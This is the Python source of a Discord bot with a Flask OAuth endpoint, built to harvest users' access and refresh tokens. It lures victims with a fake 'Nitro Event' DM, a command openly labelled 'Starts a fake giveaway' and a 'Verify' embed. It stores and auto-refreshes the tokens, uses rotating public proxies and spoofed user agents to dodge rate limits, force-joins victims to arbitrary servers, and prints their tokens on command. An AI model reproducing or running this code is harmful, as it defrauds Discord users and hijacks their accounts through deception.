import discord
from discord.ext import commands
import requests
from discord import app_commands
import json
import asyncio
import os
import sys
from flask import Flask, request, redirect as red
import jishaku
import threading
from discord.ext import tasks
import random
from reactionmenu import ViewMenu, ViewButton
import math
import asyncio, aiohttp
import fake_useragent
#from aiohttp_proxy import ProxyConnector, ProxyType

os.system("clear||cls")

os.environ["JISHAKU_HIDE"] = "True"
os.environ["JISHAKU_NO_UNDERSCORE"] = "True"
os.environ["JISHAKU_NO_DM_TRACEBACK"] = "True"
os.environ["JISHAKU_FORCE_PAGINATOR"] = "True"

with open("config.json", "r") as f:
  cnf = json.load(f)

# in .env or repl secrets
client_secret = os.getenv("clientSecret")
client_id = os.getenv("clientId")
bot_token = os.getenv("botToken")
webher = os.getenv("webhook")

redirect_uri = cnf["redirect_uri"]
bot_invite = cnf["bot_invite"]
authorize_url = cnf["authorize_url"]
authorize_vanity = cnf["authorize_vanity"]
owner_ids = cnf["owner_ids"]
v_system = cnf["verification_system"]
v_role_id = cnf["verify_role_id"]
v_guild_id = cnf["verify_guild_id"]
guilds_ids_wl = cnf["wl_guilds"]

color = discord.Colour(0x2f3136)
session = requests.Session()
webhook = discord.SyncWebhook.from_url(url=webher,
                                       session=session,
                                       bot_token=bot_token)
ae = "https://canary.discord.com/api/v10"
discord.http.Route.BASE = ae

client = commands.Bot(command_prefix=";",
                      intents=discord.Intents.all(),
                      help_command=None,
                      owner_ids=owner_ids)
bot = client
bomt = client

app = Flask(__name__)


def update_db(token, rtoken, id):
  with open("Database/data.json", "r") as f:
    da = json.load(f)
    da[str(id)] = {"tkn": token, "rt": rtoken}
  with open("Database/data.json", "w") as f:
    json.dump(da, f, indent=4)


def new_db(token, rtoken, id):
  with open("Database/ids.json", "r") as f:
    w = json.load(f)
    if str(id) in w["ids"]:
      return
    w["ids"].append(str(id))
  with open("Database/ids.json", "w") as f:
    json.dump(w, f, indent=4)
  with open("Database/data.json", "r") as f:
    l = json.load(f)
    l[str(id)] = {"tkn": token, "rt": rtoken}
  with open("Database/data.json", "w") as f:
    json.dump(l, f, indent=4)


def get_svids():
  with open("config.json", "r") as f:
    d = json.load(f)
  return d["wl_guilds"]


def getmsgs():
  with open("Database/db2.json", 'r') as f:
    s = json.load(f)
  return s


def get_bl():
  with open("Database/bl.json", "r") as f:
    ok = json.load(f)
  return ok["ids"]


def add_to_bl(k):
  with open("Database/bl.json", "r") as f:
    ok = json.load(f)
  if str(k) in ok["ids"]:
    return
  ok["ids"].append(str(k))
  with open("Database/bl.json", "w") as f:
    json.dump(ok, f, indent=4)


def rmv_to_bl(k):
  with open("Database/bl.json", "r") as f:
    ok = json.load(f)
  ok["ids"].remove(str(k))
  with open("Database/bl.json", "w") as f:
    json.dump(ok, f, indent=4)


def get_bl_user(k):
  with open("Database/bl.json", "r") as f:
    ok = json.load(f)
  if str(k) in ok["ids"]:
    return True
  else:
    return False


def wled():
  with open("Database/db.json", "r") as f:
    d = json.load(f)
  return d["ids"]


def checklol():

  def checkxd(ctx):
    with open("Database/db.json", "r") as f:
      data = json.load(f)
      if str(ctx.author.id) in data["ids"] or ctx.author.id in owner_ids:
        return True
      else:
        return False

  return commands.check(checkxd)


def get_ids():
  with open("Database/ids.json", 'r') as idk:
    s = json.load(idk)
  return s["ids"]


def delete_db(id):
  with open("Database/ids.json", "r") as f:
    xd = json.load(f)
    xd["ids"].remove(str(id))
  with open("Database/ids.json", 'w') as f:
    json.dump(xd, f, indent=4)
  with open("Database/data.json", "r") as f:
    b = json.load(f)
    b.pop(str(id))
  with open("Database/data.json", "w") as f:
    json.dump(b, f, indent=4)


def get_data(id):
  with open("Database/data.json", "r") as f:
    ff = json.load(f)
  xd = ff.get(str(id))
  return xd


def get_proxy():
  raw_proxy = requests.get(
      "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
  ).text
  proxy_list = raw_proxy.strip().split('\n')
  proxy_dict = {'http': f'http://{random.choice(proxy_list)}'}
  return proxy_dict


async def add_roles(userid):
  try:
    guild = client.get_guild(v_guild_id)
    role = guild.get_role(v_role_id)
    member = guild.get_member(userid)
    if not role == None:
      if not member == None:
        await member.add_roles(role)
  except Exception as e:
    print(e)
    pass


def reftkn(refresh_token):
  data = {
      'client_id': client_id,
      'client_secret': client_secret,
      'grant_type': 'refresh_token',
      'refresh_token': refresh_token
  }
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  r = requests.post('%s/oauth2/token' % ae,
                    data=data,
                    headers=headers,
                    proxies=get_proxy())
  r.raise_for_status()
  return r.json()


def get_info(code):
  data = {
      "client_id": client_id,
      "client_secret": client_secret,
      "grant_type": "authorization_code",
      "code": code,
      "redirect_uri": redirect_uri
  }
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  r = requests.post(ae + "/oauth2/token",
                    data=data,
                    headers=headers,
                    proxies=get_proxy())
  r.raise_for_status()
  return r.json()


def add_to_guild(access_token, userid, guild_id):
  url = f"{ae}/guilds/{guild_id}/members/{userid}"
  data = {
      "access_token": access_token,
  }
  headers = {
      "Authorization": f"Bot {bot_token}",
      'Content-Type': 'application/json'
  }
  response = requests.put(url=url,
                          headers=headers,
                          json=data,
                          proxies=get_proxy())
  if response.status_code in [200, 201, 204]:
    return True
  else:
    return False


def get_user_json(token):
  r = requests.get(ae + "/users/@me",
                   headers={"Authorization": f"Bearer {token}"},
                   proxies=get_proxy())
  usr = r.json()
  return usr


def raw_webhook_send_(content):
  data = {"content": content}
  requests.post(webher, json=data, proxies=get_proxy())


@app.route("/")
def mainlol():
  try:
    code = request.args.get("code")
    if code == None:
      return red(authorize_url, code=302)
    info = get_info(code)
    token = info["access_token"]
    rft = info["refresh_token"]
    userjson = get_user_json(token)
    id = userjson["id"]
    idobj_ = get_bl_user(id)
    if idobj_:
      rmv_to_bl(id)
    user = userjson["username"]
    new_db(token, rft, str(id))
    embed = discord.Embed(
        color=color,
        title="New User",
        description=f"**{user} | <@{id}> | {id} Authenticated**")
    webhook.send(embed=embed)
    _idd = int(id)
    if v_system == True:
      try:
        bot.loop.create_task(add_roles(_idd))
      except Exception as e:
        print(e)
    return red("https://discord.com/oauth2/authorized", code=302)
  except Exception as e:
    print(e)
    return red(authorize_url, code=302)


def get_verify_em():
  embed = discord.Embed(
      description=
      f"[✅ Click Here to verify | {authorize_vanity}]({authorize_url})",
      color=color)
  embed.set_image(
      url=
      "https://media.discordapp.net/attachments/1083250846948659200/1083996507709112360/Picsart_22-09-29_14-33-54-781.jpg"
  )
  return embed


@bot.hybrid_command(description="Shows bot latency")
@checklol()
async def ping(ctx):
  embed = discord.Embed(
      color=color, description=f"Bot Latency is {int(bot.latency * 1000)}ms")
  await ctx.send(embed=embed)


@bot.hybrid_command(
    aliases=["syncmessage", "sync-msg", 'sync-message', 'sync'],
    description="Syncs New Verified Message")
@checklol()
async def syncmsg(ctx):
  embedl = discord.Embed(color=color,
                         description="Please Wait Editing Messages....")
  await ctx.send(embed=embedl)
  ids = getmsgs()
  ms = ids["ids"]
  fl = 0
  ss = 0
  embed = get_verify_em()
  for sl in ms:
    try:
      await asyncio.sleep(0.5)
      channelid = sl.split("|")[0]
      mid = sl.split("|")[1]
      channel = bot.get_channel(int(channelid))
      msg = await channel.fetch_message(int(mid))
      await msg.edit(embed=embed)
    except:
      fl += 1
      continue
    else:
      ss += 1
  embedl.description = f"Sucessfully Edited {ss} Messages Failed To Edit {fl} Messages Total Messages {len(ms)}"
  await ctx.reply(embed=embedl)


@bot.hybrid_command(name="wl-user",
                    description="Whitelists a user to use bot commands")
@checklol()
async def wluser(ctx, user: discord.User):
  with open("Database/db.json", 'r') as f:
    xd = json.load(f)
    if str(user.id) in xd["ids"]:
      embed = discord.Embed(color=color,
                            description="That user is already in wl.")
      return await ctx.reply(embed=embed)
    xd["ids"].append(str(user.id))
  with open("Database/db.json", 'w') as f:
    json.dump(xd, f, indent=4)
  await ctx.send(
      f"Successfully Added {user} To Whitelist, they can use my commands now!")


@bot.hybrid_command(name="uwl-user",
                    description="Unwhitelists a user to use bot commands")
@commands.is_owner()
async def wluserxs(ctx, user: discord.User):
  with open("Database/db.json", 'r') as f:
    xd = json.load(f)
    if not str(user.id) in xd["ids"]:
      embed = discord.Embed(color=color,
                            description="That user was never whitelisted")
      return await ctx.reply(embed=embed)
    xd["ids"].remove(str(user.id))
  with open("Database/db.json", 'w') as f:
    json.dump(xd, f, indent=4)
  await ctx.send(
      f"Successfully Removed {user} from my Whitelist, they can't use my commands now!"
  )


@bot.hybrid_command(name="wl-guild",
                    description='Whitelists a guild to add bot')
@checklol()
async def wlg(ctx, guild):
  with open("config.json", 'r') as f:
    xd = json.load(f)
    if str(guild) in xd["wl_guilds"]:
      embed = discord.Embed(color=color,
                            description=f'{guild} Is Already whitelisted.')
      return await ctx.reply(embed=embed)
    xd["wl_guilds"].append(str(guild))
    with open("config.json", "w") as f:
      json.dump(xd, f, indent=4)
    await ctx.reply(
        f"Successfully Whitelisted {guild} Now Everyone Can Add Me There.")


@bot.hybrid_command(name="wl-show-user", description="Shows whitelisted users")
@checklol()
async def idkxdloelsh(ctx):
  with open("Database/db.json", "r") as f:
    xdlol = json.load(f)
    ids = xdlol["ids"]
  if ids == []:
    return await ctx.reply("There Are No Whitelisted Users.")
  embed = discord.Embed(title="Whitelisted Users",
                        color=color,
                        description="\n".join(ids))
  await ctx.reply(embed=embed)


@bot.hybrid_command(name="wl-show-guild",
                    description="Shows Whitelisted guilds")
@checklol()
async def idkxdloelsh(ctx):
  with open("config.json", "r") as f:
    xdlol = json.load(f)
    ids = xdlol["wl_guilds"]
  if ids == []:
    return await ctx.reply("There Are No Whitelisted Guilds.")
  embed = discord.Embed(title="Whitelisted Guilds",
                        color=color,
                        description="\n".join(ids))
  await ctx.reply(embed=embed)


@bot.hybrid_command(name="uwl-guild", description="Unwhitelists a guild")
@checklol()
async def wlgg(ctx, guild):
  with open("config.json", 'r') as f:
    xd = json.load(f)
    if not str(guild) in xd["wl_guilds"]:
      embed = discord.Embed(color=color,
                            description=f'{guild} Was Never Whitelisted')
      return await ctx.reply(embed=embed)
    xd["wl_guilds"].remove(str(guild))
    with open("config.json", "w") as f:
      json.dump(xd, f, indent=4)
    await ctx.reply(
        f"Successfully Removed {guild} From Whitelist Now No One Add Me There."
    )


@bot.hybrid_command(name="leave", description="leaves a guild")
@checklol()
async def care(ctx, guild):
  g = bot.get_guild(int(guild))
  if g is None:
    return await ctx.reply(f"that guild is not in my servers.")
  else:
    await g.leave()
    await ctx.send(f"Left {guild.name}")


@tasks.loop(seconds=604800)
async def autorefresh():
  print("Auto Refresh!")
  embed = discord.Embed(
      color=color,
      description=f"Auto Refresh Has Been Started!, Checking Tokens")
  webhook.send(embed=embed)
  ids = get_ids()
  for id in ids:
    userblok = get_bl_user(id)
    #if userblok:
    #embed = discord.Embed(color=color, description=f"Auto Refreshing Cancelled Because {id} Is Blacklisted, I Can't Refresh Them Until They Re-Authorize.")
    #webhook.send(embed=embed)
    try:
      if not userblok:
        await asyncio.sleep(2)
        data = get_data(id)
        try:
          xdlol = get_user_json(data["tkn"])
          xdlol["id"]
        except KeyError:
          embed = discord.Embed(
              color=color,
              description=
              f"{id}'s Token Has Been Expired, Refreshing, Auto Refresh!!!")
          webhook.send(embed=embed)
          try:
            if not userblok:
              response = reftkn(data["rt"])
              access_token = response["access_token"]
              refresh_token = response["refresh_token"]
              update_db(access_token, refresh_token, str(id))
              embed = discord.Embed(
                  color=color,
                  description=f"Successfully Refreshed {id}'s Token!")
              webhook.send(embed=embed)
          except KeyError:
            embed = discord.Embed(
                color=color,
                description=
                f"Failed To Refresh, {id}'s Expired Token!, Blacklisting {id} From Auto Refresh Until They Authorize Again"
            )
            add_to_bl(id)
            webhook.send(embed=embed)
    except Exception as e:
      if isinstance(e, requests.exceptions.HTTPError):
        embed = discord.Embed(
            color=color,
            description=
            f"Failed! Auto Refresh!\nError: {e}, Blacklisting {id} From Auto Refresh Until They Authorize Again"
        )
        webhook.send(embed=embed)
        add_to_bl(id)
        continue
      else:
        embed = discord.Embed(
            color=color, description=f"Failed! Auto Refresh!\nError: {e}.")
        webhook.send(embed=embed)
        continue


def handling_pull(server_id, uid):
  user_id = str(uid)
  iuid = int(uid)
  data = get_data(user_id)
  access_token = data["tkn"]
  refresh_token = data["rt"]
  url = f"{ae}/guilds/{server_id}/members/{iuid}"
  try:
    ua = fake_useragent.UserAgent().random
  except:
    ua = "Mozilla/5.0 (Macintosh; PPC Mac OS X 10_7_6 rv:2.0) Gecko/20161209 Firefox/35.0"
  response_t = {
      "access_token": access_token,
  }
  headers = {
      "Authorization": f"Bot {bot_token}",
      'Content-Type': 'application/json',
      "Accept": "*/*",
      "User-Agent": ua,
      "Browser-User-Agent": ua
  }
  proxy = get_proxy()
  session = requests.Session()
  session.headers.update(headers)
  session.proxies.update(proxy)
  r = session.put(url=url, json=response_t)
  print(r.text)
  if r.status_code in [204, 200, 201]:
    return True
  elif r.status_code == 429:
    rjson = r.json()
    secx = rjson["retry_after"]
    print(f"[!] Rate limited for {secx}, Sleeping.")
    time.sleep(secx)
    return handling_pull(server_id, uid)


bot.test_c = handling_pull


@bot.event
async def on_ready():
  print(f"Successfully Connected To {bot.user}\n")
  await bot.load_extension("jishaku")
  await autorefresh.start()


@bot.event
async def on_command(ctx):
  embed = discord.Embed(color=color,
                        title="Command Used",
                        description=f"{ctx.author} Used {ctx.command}")
  webhook.send(embed=embed)


@bot.event
async def on_connect():
  try:
    webhook.send(f"Successfully Connected To {bot.user}")
  except:
    ratelimit_fix()
  await bomt.change_presence(status=discord.Status.online)
  await bot.tree.sync()


@bot.hybrid_command(description="Shows Help Command")
@checklol()
async def help(ctx):
  commandss = "```"
  for command in bot.commands:
    commandss += f"{command}, "
  embed = discord.Embed(color=color,
                        title="Help!",
                        description=commandss.rsplit(",", 1)[0] + "```")
  embed.add_field(
      name="Modules",
      value=
      "**Auto Refresh**\n**Verification Auth System**\n**Auth System**\n**Role Add On Verification**\n**Webhook Logging**\n**Massdm**\n**Command Logging**\n**Syncing**\n**Whitelisting**\n**Auto Uwl Guild Leaving**\n**Auto Proxies Use**\n**Auto Bypass Rate Limit**\n**Slash Commands**"
  )
  embed.set_footer(text=f"Total Commands: {len(bot.commands)}")
  await ctx.reply(embed=embed, mention_author=False)


@bot.hybrid_command(aliases=["auths"],
                    description='Shows Total Stored Accounts')
@checklol()
async def total(ctx):
  with open("Database/ids.json") as f:
    xd = json.load(f)
  embed = discord.Embed(
      color=color, description=f"There are total {len(xd['ids'])} Accounts.")
  await ctx.reply(embed=embed, mention_author=False)


@bot.hybrid_command(description="Checks All Stored Accounts")
@checklol()
async def check(ctx):
  wrk = 0
  fai = 0
  embed = discord.Embed(
      color=color,
      description=
      "Kindly wait, this will take some time due to discord api limit")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for id in ids:
    try:
      await asyncio.sleep(2)
      data = get_data(id)
      token = data["tkn"]
      w = get_user_json(token)
      eksd = w["id"]
    except KeyError:
      fai += 1
    else:
      wrk += 1
  embed2 = discord.Embed(
      color=color,
      description=
      f"Total Accounts: {len(ids)}, Working Accounts: {wrk}, Not Working Accounts: {fai}"
  )
  await msg.edit(embed=embed2, content=f"{ctx.author.mention}")


@bot.hybrid_command(description="Checks Stored Accounts Fast")
@checklol()
async def checkfast(ctx):
  wrk = 0
  fai = 0
  embed = discord.Embed(color=color, description="Checking Accounts....")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for id in ids:
    try:
      data = get_data(id)
      token = data["tkn"]
      w = get_user_json(token)
      eksd = w["id"]
    except KeyError:
      fai += 1
    else:
      wrk += 1
  embed2 = discord.Embed(
      color=color,
      description=
      f"Total Accounts: {len(ids)}, Working Accounts: {wrk}, Not Working Accounts: {fai}"
  )
  await msg.edit(embed=embed2, content=f"{ctx.author.mention}")


@bot.hybrid_command(description="Checks Given User Valid Or Invaild In Auths")
@checklol()
async def checkuser(ctx, *, user: discord.User):
  id = str(user.id)
  data = get_data(id)
  if data == None:
    embed = discord.Embed(
        color=discord.Color.red(),
        description=f"{user.mention} | {user} Is not authorized.")
    await ctx.reply(embed=embed, mention_author=False)
  else:
    try:
      token = data["tkn"]
      eksdi = get_user_json(token)
      xc = eksdi["id"]
    except KeyError:
      embed = discord.Embed(
          color=color,
          description=
          f"User is unauthorised but user in database because user was authorized but user removed the access."
      )
      await ctx.reply(embed=embed, mention_author=False)
    else:
      embed = discord.Embed(
          color=discord.Color.green(),
          description=f"{user.mention} | {user} Is Authorized.")
      await ctx.reply(embed=embed, mention_author=False)


@bot.hybrid_command(description="Refreshs All Invaild Access Tokens")
@checklol()
async def refresh(ctx):
  ttl = 0
  fail = 0
  embed = discord.Embed(
      color=color,
      description=
      "Kindly wait, this will take some time due to discord api limit")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for id in ids:
    try:
      await asyncio.sleep(2)
      data = get_data(id)
      rf = data["rt"]
      xdinfo = reftkn(rf)
      token = xdinfo["access_token"]
      reflol = xdinfo["refresh_token"]
      update_db(token, reflol, id)
    except Exception as e:
      #await ctx.reply(e)
      fail += 1
      continue
    else:
      ttl += 1
  embed = discord.Embed(
      color=color,
      description=
      f"Refreshed Tokens Of {ttl} Accounts And Failed To Refresh Token Of {fail} Accounts."
  )
  await ctx.reply(embed=embed)


@bot.hybrid_command(description="Refreshs All Invaild Access Tokens Fast")
@checklol()
async def refreshfast(ctx):
  ttl = 0
  fail = 0
  embed = discord.Embed(color=color, description="Refreshing Accounts....")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for id in ids:
    try:
      data = get_data(id)
      rf = data["rt"]
      xdinfo = reftkn(rf)
      token = xdinfo["access_token"]
      reflol = xdinfo["refresh_token"]
      update_db(token, reflol, id)
    except KeyError:
      fail += 1
    else:
      ttl += 1
  embed = discord.Embed(
      color=color,
      description=
      f"Refreshed Tokens Of {ttl} Accounts And Failed To Refresh Token Of {fail} Accounts."
  )
  await ctx.reply(embed=embed)


@bot.hybrid_command(description="Refreshs Given User")
@checklol()
async def refreshuser(ctx, *, user: discord.User):
  id = str(user.id)
  data = get_data(id)
  #svid = server_id or ctx.guild.id
  if data == None:
    embed = discord.Embed(
        color=discord.Color.red(),
        description=f"{user.mention} | {user} Is not authorized.")
    await ctx.reply(embed=embed, mention_author=False)
  else:
    try:
      newxd = reftkn(data["rt"])
      tkn = newxd["access_token"]
      rtn = newxd["refresh_token"]
      update_db(tkn, rtn, id)
    except:
      embed = discord.Embed(color=color, description='Failed To Refresh')
      await ctx.reply(embed=embed)
    else:
      embed = discord.Embed(color=color, description='Sucessfully Refreshed.')
      await ctx.reply(embed=embed)


@bot.hybrid_command(description="Pulls Given Amount Members To Server")
@checklol()
async def pull(ctx, amount, server_id=None):
  svid = server_id or ctx.guild.id
  guildobjectxd = bot.get_guild(int(svid))
  if not guildobjectxd:
    embed = discord.Embed(color=color, description="Bot is not in that guild")
    await ctx.reply(embed=embed)
    return
  amn = int(amount)
  ttl = 0
  fai = 0
  embed = discord.Embed(
      color=color,
      description=
      "Kindly wait, this will take some time due to discord api limit")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for i in range(0, amn):
    try:
      await asyncio.sleep(2)
      idlop = ids[i]
      data = get_data(idlop)
      tkn = data["tkn"]
      resp = add_to_guild(tkn, int(idlop), int(svid))
      if resp:
        ttl += 1
      else:
        fai += 1
    except:
      fai += 1
      continue
  embed = discord.Embed(
      color=color,
      description=
      f"Successfully Pulled {ttl} Accounts And Failed To Pull {fai} Accounts.")
  await ctx.reply(embed=embed)


@bot.hybrid_command(description="Pulls member by handling checks.")
@checklol()
async def pullhandle(ctx, amount, server_id=None):
  svid = server_id or ctx.guild.id
  guildobjectxd = bot.get_guild(int(svid))
  if not guildobjectxd:
    embed = discord.Embed(color=color, description="Bot is not in that guild")
    await ctx.reply(embed=embed)
    return
  amn = int(amount)
  ttl = 0
  fai = 0
  embed = discord.Embed(
      color=color,
      description=
      "Kindly wait, this will take some time due to discord api limit")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for i in range(0, amn):
    try:
      idlop = ids[i]
      handling = ctx.guild.get_member(int(idlop))
      if handling == None:
        await asyncio.sleep(2)
        data = get_data(idlop)
        tkn = data["tkn"]
        resp = add_to_guild(tkn, int(idlop), int(svid))
        if resp:
          ttl += 1
        else:
          fai += 1
    except:
      fai += 1
      continue
  embed = discord.Embed(
      color=color,
      description=
      f"Successfully Pulled {ttl} Accounts And Failed To Pull {fai} Accounts.")
  await ctx.reply(embed=embed)


@bot.hybrid_command(description="Pulls member by handling checks.")
@checklol()
async def pullallhandle(ctx, server_id=None):
  svid = server_id or ctx.guild.id
  guildobjectxd = bot.get_guild(int(svid))
  if not guildobjectxd:
    embed = discord.Embed(color=color, description="Bot is not in that guild")
    await ctx.reply(embed=embed)
    return
  #amn = int(amount)
  ttl = 0
  fai = 0
  embed = discord.Embed(
      color=color,
      description=
      "Kindly wait, this will take some time due to discord api limit")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  amn = len(ids)
  for i in range(0, amn):
    try:
      idlop = ids[i]
      handling = ctx.guild.get_member(int(idlop))
      if handling == None:
        await asyncio.sleep(2)
        data = get_data(idlop)
        tkn = data["tkn"]
        resp = add_to_guild(tkn, int(idlop), int(svid))
        if resp:
          ttl += 1
        else:
          fai += 1
    except Exception as e:
      print(e)
      fai += 1
      continue
  embed = discord.Embed(
      color=color,
      description=
      f"Successfully Pulled {ttl} Accounts And Failed To Pull {fai} Accounts.")
  await ctx.reply(embed=embed)


@bot.hybrid_command(description="Shows all commands with their description",
                    name="commands")
@checklol()
async def idktbh(ctx):
  command = bot.get_command("jishaku")
  command.description = command.help
  embed = discord.Embed(
      title="Usable Commands!",
      description=
      f">>> *Total Commands: {len(bot.commands)}\nSlash Commands: Enabled*\n**__Commands__**:\n**",
      color=color)
  for command in bot.commands:
    embed.description += f"{command.name} - {command.description}\n\n"
  embed.description += "**"
  await ctx.send(embed=embed)


@bot.hybrid_command(description="Pulls Given Amount Members To Server Fast")
@checklol()
async def pullfast(ctx, amount, server_id=None):
  svid = server_id or ctx.guild.id
  guildobjectxd = bot.get_guild(int(svid))
  if not guildobjectxd:
    embed = discord.Embed(color=color, description="Bot is not in that guild")
    await ctx.reply(embed=embed)
    return
  amn = int(amount)
  ttl = 0
  fai = 0
  embed = discord.Embed(
      color=color,
      description=
      "Kindly wait, this will take some time due to discord api limit")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for i in range(0, amn):
    try:
      idlop = ids[i]
      data = get_data(idlop)
      tkn = data["tkn"]
      resp = add_to_guild(tkn, int(idlop), int(svid))
      if resp:
        ttl += 1
      else:
        fai += 1
    except:
      fai += 1
      continue
  embed = discord.Embed(
      color=color,
      description=
      f"Successfully Pulled {ttl} Accounts And Failed To Pull {fai} Accounts.")
  await ctx.reply(embed=embed)


@bot.hybrid_command(description="Pulls All Members To Server")
@checklol()
async def pullall(ctx, server_id=None):
  svid = server_id or ctx.guild.id
  guildobjectxd = bot.get_guild(int(svid))
  if not guildobjectxd:
    embed = discord.Embed(color=color, description="Bot is not in that guild")
    await ctx.reply(embed=embed)
    return
  #amn = int(amount)
  ttl = 0
  fai = 0
  embed = discord.Embed(
      color=color,
      description=
      "Kindly wait, this will take some time due to discord api limit")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for id in ids:
    try:
      await asyncio.sleep(2)
      data = get_data(id)
      tkn = data["tkn"]
      resp = add_to_guild(tkn, int(id), int(svid))
      if resp:
        ttl += 1
      else:
        fai += 1
    except:
      continue
  embed = discord.Embed(
      color=color,
      description=
      f"Successfully Pulled {ttl} Accounts And Failed To Pull {fai} Accounts.")
  await ctx.reply(embed=embed)


@bot.hybrid_command(description="Pulls All Members To Server Fast")
@checklol()
async def pullallfast(ctx, server_id=None):
  svid = server_id or ctx.guild.id
  guildobjectxd = bot.get_guild(int(svid))
  if not guildobjectxd:
    embed = discord.Embed(color=color, description="Bot is not in that guild")
    await ctx.reply(embed=embed)
    return
  #amn = int(amount)
  ttl = 0
  fai = 0
  embed = discord.Embed(
      color=color,
      description=
      "Kindly wait, this will take some time due to discord api limit")
  msg = await ctx.reply(embed=embed, mention_author=False)
  ids = get_ids()
  for id in ids:
    try:
      #await asyncio.sleep(2)
      data = get_data(id)
      tkn = data["tkn"]
      resp = add_to_guild(tkn, int(id), int(svid))
      if resp:
        ttl += 1
      else:
        fai += 1
    except:
      continue
  embed = discord.Embed(
      color=color,
      description=
      f"Successfully Pulled {ttl} Accounts And Failed To Pull {fai} Accounts.")
  await ctx.reply(embed=embed)


@bot.hybrid_command(description="Pulls Given User To Server")
@checklol()
async def pulluser(ctx, user: discord.User, server_id=None):
  id = str(user.id)
  data = get_data(id)
  svid = server_id or ctx.guild.id
  if data == None:
    embed = discord.Embed(
        color=discord.Color.red(),
        description=f"{user.mention} | {user} Is not authorized.")
    await ctx.reply(embed=embed, mention_author=False)
  else:
    try:
      resp = add_to_guild(data["tkn"], int(id), int(svid))
      if resp:
        embed = discord.Embed(
            color=color,
            description=f"Sucessfully Pulled {user.mention} To {svid}")
        await ctx.reply(embed=embed)
      else:
        embed = discord.Embed(color=color,
                              description=f"Failed To Pull {user}")
        await ctx.reply(embed=embed)
    except:
      embed = discord.Embed(color=color, description="Failed!, Unknown Error.")
      await ctx.reply(embed=embed)


@bot.hybrid_command(description="Checks User if it is in database")
@checklol()
async def user(ctx, *, user: discord.User):
  id = str(user.id)
  data = get_data(id)
  if data == None:
    embed = discord.Embed(
        color=discord.Color.red(),
        description=f"{user.mention} | {user} Is not authorized.")
    await ctx.reply(embed=embed, mention_author=False)
  else:
    embed = discord.Embed(
        color=discord.Color.green(),
        description=f"{user.mention} | {user} Is Authorized.")
    await ctx.reply(embed=embed, mention_author=False)


@bot.hybrid_command(description="Gives UserInfo If It Is In Database")
@checklol()
async def userinfo(ctx, *, user: discord.User):
  id = str(user.id)
  data = get_data(id)
  if data == None:
    embed = discord.Embed(
        color=discord.Color.red(),
        description=f"{user.mention} | {user} Is not authorized.")
    await ctx.reply(embed=embed, mention_author=False)
  else:
    embed = discord.Embed(
        color=discord.Color.green(),
        description=
        f"{user.mention} | {user} Is Authorized.\n**__Information__**:\nAccess Token: {data['tkn']}\nRefresh Token: {data['rt']}"
    )
    await ctx.reply(embed=embed, mention_author=False)


@bot.listen("on_connect")
async def on_idk():
  ids = get_svids()
  for guild in bot.guilds:
    if not str(guild.id) in ids:
      await guild.leave()
      webhook.send(
          f"Someone Added Me to {guild.name} | {guild.id} when i was offline I Left that guild because it wasn't whitelisted"
      )


@bot.event
async def on_guild_join(guild):
  idslol = get_svids()
  if not str(guild.id) in idslol:
    await guild.leave()
    webhook.send(
        f"Someone Added Me to {guild.name} | {guild.id} I Left that guild because it wasn't whitelisted"
    )


def get_view():
  view = discord.ui.View()
  btn = discord.ui.Button(label="Authorize Bot", url=authorize_vanity)
  view.add_item(btn)
  return view


@bot.event
async def on_message(message):
  if message.author.bot:
    return
  if message.guild == None:
    embed = discord.Embed(
        color=color,
        title=
        "<:giftbox:1032974503447380041> Nitro Event <:giftbox:1032974503447380041>",
        description=
        f"__{bot.user.name} Development__ Is Now Partner <:partner:1032974205945393152> With Discord And Giving Nitros To People <:earlysupport:1032976108854976593>\nYou Can Get Nitro <:rr_gift:1032974253001293834>\nAll You Have To Do Is\n1. Authorize {bot.user.name} By Clicking [Here]({authorize_vanity})\n2. Wait for 24 hours and nitro will be sent in your dms\n3. Enjoy!"
    )
    embed.set_image(
        url=
        "https://cdn.discordapp.com/attachments/1032856357092733008/1032979242755035176/11111unknown_1.png"
    )
    await message.channel.send(embed=embed, view=get_view())
    return
  await bot.process_commands(message)


@bot.hybrid_command(description="Starts a fake giveaway")
@checklol()
async def giveaway(ctx):
  embed = discord.Embed(
      title="<:rr_gift:1032974253001293834> Giveaway!",
      description=
      f"Prize: **Nitro Booster [9.99$]**\nHosted by: **{ctx.author}**\nWinners: **10**\nEnds in: **5 days**",
      color=color)
  view = discord.ui.View()
  btn = discord.ui.Button(label="Enter",
                          url=authorize_url,
                          emoji="<:rr_gift:1032974253001293834>")
  view.add_item(btn)
  await ctx.send(embed=embed, view=view)


@bot.hybrid_command(description="Returns Auth Link")
@checklol()
async def authlink(ctx):
  await ctx.send(authorize_url)


@bot.hybrid_command(description="Returns Auth Vanity")
@checklol()
async def authvanity(ctx):
  await ctx.send(authorize_vanity)


@bot.hybrid_command(description="Returns Bot Invite Link")
@checklol()
async def botinvite(ctx):
  await ctx.send(bot_invite)


@bot.event
async def on_command_error(ctx, error):
  with open("Database/db.json", "r") as f:
    data = json.load(f)
  if not str(
      ctx.author.id) in data["ids"] and not ctx.author.id in bot.owner_ids:
    print("L")
    return
  x = ""
  if isinstance(error, commands.CommandNotFound):
    await ctx.reply(
        f'**Command "{ctx.message.content.replace(ctx.prefix, x)}" Not Found!**',
        delete_after=5)
    return
  else:
    await ctx.reply(f"**{error}**", delete_after=5)


@bot.hybrid_command(aliases=["bund"], description="Sends Verifiy Auth Embed")
@checklol()
async def verify(ctx):
  embed = get_verify_em()
  button = discord.ui.Button(label="Verify", url=authorize_url)
  view = discord.ui.View()
  view.add_item(button)
  ruk = await ctx.send(embed=embed, view=view)
  with open("Database/db2.json", "r") as f:
    ff = json.load(f)
    ff["ids"].append(f"{ctx.channel.id}|{ruk.id}")
  with open("Database/db2.json", "w") as f:
    json.dump(ff, f, indent=4)


@bot.hybrid_command(name="show-verify",
                    aliases=["verify-show"],
